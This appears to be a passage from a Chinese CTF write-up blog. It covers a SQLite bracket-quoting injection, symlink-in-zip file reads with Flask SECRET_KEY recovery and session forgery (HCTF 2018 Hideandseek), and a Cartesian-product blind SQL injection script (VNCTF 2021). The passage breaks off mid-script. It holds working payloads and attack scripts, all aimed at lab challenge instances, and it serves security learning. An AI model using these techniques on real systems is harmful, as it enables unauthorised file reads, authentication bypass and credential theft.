<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> is_valid(<span class="variable">$string</span>) &#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    // comment out, calling <span class="keyword">function</span>...</span><br><span class="line">    <span class="string">&quot;[\&quot;#&#x27;()*,\\/\\\\`-]&quot;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 0x20; <span class="variable">$i</span> &lt; 0x7f; <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$c</span> = chr(<span class="variable">$i</span>);</span><br><span class="line">  <span class="keyword">if</span> (is_valid(<span class="variable">$c</span>)) &#123;</span><br><span class="line">    <span class="variable">$res</span> .= <span class="variable">$c</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$res</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$ php test.php</span><br><span class="line"> !$%&amp;+.0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br></pre></td></tr></table></figure>
<p><code>[</code>和<code>]</code>是可用的,我们在使用sqlite语法的时候列名是可以加方括号的，是为了和mysql语法兼容。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">sql</span>] <span class="keyword">from</span> sqlite_master;</span><br></pre></td></tr></table></figure>
<p>select的时候，当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符</p>
<p><img src="https://img.npfs06.top/20210314210748.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>而  “ ‘ ` [] 都可以正常包裹列名：</p>
<p><img src="https://img.npfs06.top/20210314211650.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>此外，SQLite 还有 CREATE TABLE… AS 语句，可用于从另一个表创建表。创建表时可以不用带括号。例如：</p>
<p><img src="https://img.npfs06.top/20210314210648.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>关键代码如下：<br><img src="https://img.npfs06.top/20210314211541.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>sql语句大致是这样的</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE $table_name (dummy1 <span class="built_in">TEXT</span>, dummy2 <span class="built_in">TEXT</span>, `$<span class="built_in">column</span>` $<span class="built_in">type</span>);</span><br></pre></td></tr></table></figure>
<p>输入<br><code>table_name=[aaa] as select [sql][&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</code></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">CREATE</span> TABLE [aaa] <span class="keyword">as</span> <span class="keyword">select</span> [sql][ (dummy1 TEXT, dummy2 TEXT, <span class="symbol">`]from sqlite_master;`</span> <span class="number">2</span>);&quot;;</span><br></pre></td></tr></table></figure>
<p>等于</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [aaa] <span class="keyword">as</span> <span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master</span><br><span class="line">查找sqlite_master中<span class="keyword">sql</span>列的值放入aaa表中</span><br></pre></td></tr></table></figure>
<p>得到数据库名和字段名</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">CREATE</span> TABLE `flag_bf<span class="number">1811</span>da` (`flag_<span class="number">2</span>a<span class="number">2</span>d<span class="number">04</span>c<span class="number">3</span>` TEXT)</span><br></pre></td></tr></table></figure>
<p>继续读取</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">table_name=<span class="comment">[aaa]</span>as select <span class="comment">[flag_2a2d04c3]</span><span class="comment">[&amp;columns<span class="comment">[0]</span><span class="comment">[name]</span>=]</span>from flag_bf1811da;&amp;columns<span class="comment">[0]</span><span class="comment">[type]</span>=2</span><br><span class="line">$sql = <span class="string">&quot;CREATE TABLE <span class="subst">[aaa]</span> as select <span class="subst">[flag_2a2d04c3]</span><span class="subst">[ (dummy1 TEXT, dummy2 TEXT, `]</span>from flag_bf1811da;` 2);&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>等于</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">create</span> table aaa as select flag_<span class="number">2</span>a<span class="number">2</span>d<span class="number">04</span>c<span class="number">3</span> from flag_bf<span class="number">1811</span>da</span><br></pre></td></tr></table></figure>




<h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><p>只有登录功能有用，没有注册功能，简单测试一下登录功能，发现随便输用户名和密码，都能以输入的用户名登录，除了admin之外,猜想是要通过某种方式使用admin登录获取flag。登录之后，来到一个上传页面。</p>
<p>发现需要上传zip，上传了一个1.txt的文件，页面会返回文件里的内容，这时猜想是否可以进行任意文件读取</p>
<p>这里利用软连接进行文件读取</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">这里先科普一下Linux的几个命令</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. ln</span><br><span class="line">功能：</span><br><span class="line">连接文件或目录。为某一个文件在另外一个位置建立一个同步的链接。当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</span><br><span class="line"></span><br><span class="line">可分为硬连接和符号连接</span><br><span class="line"><span class="selector-attr">[硬链接]</span></span><br><span class="line">只能引用同一文件系统中的文件。它引用的是文件在文件系统中的物理索引（也称为 inode）。</span><br><span class="line">当您移动或删除原始文件时，硬链接不会被破坏，因为它所引用的是文件的物理数据而不是文件在文件结构中的位置。</span><br><span class="line">硬链接的文件不需要用户有访问原始文件的权限，也不会显示原始文件的位置，这样有助于文件的安全。</span><br><span class="line">如果您删除的文件有相应的硬链接，那么这个文件依然会保留，直到所有对它的引用都被删除。</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[符号链接]</span></span><br><span class="line">符号链接 是一个指针，指向文件在文件系统中的位置。</span><br><span class="line">符号链接可以跨文件系统，甚至可以指向远程文件系统中的文件。</span><br><span class="line">符号链接只是指明了原始文件的位置，用户需要对原始文件的位置有访问权限才可以使用链接。如果原始文件被删除，所有指向它的符号链接也就都被破坏了。</span><br><span class="line">它们会指向文件系统中并不存在的一个位置。</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[使用方法]</span></span><br><span class="line"><span class="comment">//硬链接</span></span><br><span class="line">ln <span class="selector-tag">a</span><span class="selector-class">.txt</span> <span class="selector-tag">b</span>.txt</span><br><span class="line"><span class="comment">//符号链接</span></span><br><span class="line">ln -s <span class="selector-tag">a</span><span class="selector-class">.txt</span> <span class="selector-tag">b</span>.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. zip</span><br><span class="line">功能：用于压缩文件</span><br><span class="line"></span><br><span class="line">-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效</span><br><span class="line"></span><br><span class="line">将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 <span class="selector-tag">html</span>.zip：</span><br><span class="line">zip -<span class="selector-tag">q</span> -r <span class="selector-tag">html</span><span class="selector-class">.zip</span> /home/html</span><br></pre></td></tr></table></figure>
<p>我们使用如下命令生成软连接</p>
<p><code>ln -s /proc/self/environ passwd</code>，获取系统环境变量,生成一个指向<code>/etc/passwd</code>文件的软链接</p>
<p>然后用<code>zip -y passwd.zip passwd</code>命令压缩，</p>
<p>然后上传，结果如下图，成功读取。</p>
<p><img src="https://img.npfs06.top/20210314215429.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>和前面<code>admin</code>不能登录联系起来，猜测这里可能是要用软链接读取相关文件使得可以用admin身份登录。也就是说是要读取跟admin相关的文件，然后以admin身份登录出flag，那么跟admin相关的文件有什么呢，密码文件肯定不是的，因为这个登录就没用到密码，没用到数据库，那既然没用到数据库，程序怎么知道登录用户身份呢，只能是通过session或cookie。于是看一下页面cookie信息，<code>session=eyJ1c2VybmFtZSI6IjEyMyJ9.Ey-iAg.rmAsie7g8AlN3TSdm9GD9-vTGzI</code>，很像flask的session信息，解密如下</p>
<p><img src="https://img.npfs06.top/20210314222920.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>到这里思路就大致清晰了，我们要用到上传zipfile读取到<code>SECRET_KEY</code>，然后伪造admin的session进行登录。</p>
<p>看了一下之后发现/app/uwsgi.ini这个配置文件，上传zip读取一下</p>
<p><img src="https://img.npfs06.top/20210314220050.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>接下去读py文件，这里有个bug</p>
<p>由于是在buu复现，和原题不太一样，原题的main目录并不是这个，而我们去读取原题的main文件才是真正的<code>main.py</code><br>原题main.py <code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure>
<p>之前复现[CISCN2019 华东南赛区]Web4时做到过，接下去的做法也基本相同</p>
<p><strong>对全部的源码进行分析了，直接查找所需的SECRET_KEY的值发现：</strong></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="built_in">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(<span class="built_in">random</span>.<span class="built_in">random</span>()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p><strong>其对SECRET_KEY做了random随机处理，但random生成的随机数都是伪随机数，有一定的规律。</strong><br><strong>发现了其中：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">random</span>.seed(<span class="built_in">uuid</span>.getnode())</span><br></pre></td></tr></table></figure>
<p><strong>random.seed()方法改变随机数生成器的种子，Python之random.seed()用法</strong><br><strong>uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址</strong></p>
<p><strong>若获取了服务器的MAC地址值，那么就可以构造出为伪随机的种子值，想到Linux中一切皆文件，查找到MAC地址存放在/sys/class/net/eth0/address文件中，读取该文件：得到其十六进制所表示的MAC地址</strong></p>
<blockquote>
<p>02:42:ac:10:9d:30</p>
</blockquote>
<p>然后脚本把它转换为10进制数，然后转换成SECRET_KEY</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">mac = &quot;02:42:ac:10:9d:30&quot;</span><br><span class="line"><span class="keyword">temp</span> = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="keyword">temp</span> = [<span class="type">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">temp</span>]</span><br><span class="line"><span class="keyword">temp</span> = [bin(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">temp</span>]</span><br><span class="line"><span class="keyword">temp</span> = <span class="string">&#x27;&#x27;</span>.<span class="keyword">join</span>(<span class="keyword">temp</span>)</span><br><span class="line">mac = <span class="type">int</span>(<span class="keyword">temp</span>,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure>


<p>然后利用flask-session-cookie-manager进行伪造即可，然后将得到的伪session代替原session，即可得到flag</p>
<p><img src="https://img.npfs06.top/20210314223541.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="VNCTF-2021-realezjvav"><a href="#VNCTF-2021-realezjvav" class="headerlink" title="[VNCTF 2021]realezjvav"></a>[VNCTF 2021]realezjvav</h2><p>查看源码</p>
<p><img src="https://img.npfs06.top/20210317191712.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>再结合hint，很明显要sql注入</p>
<p>fuzz一下 发现过滤的并不多 但是延时函数sleep()等过滤了 并且貌似不能布尔盲注 搜了下 可以笛卡尔积盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://d1dce35d-de55-4046-a7a0-ca8e319394d7.node3.buuoj.cn//user/login&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        p1=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p1&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p2&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            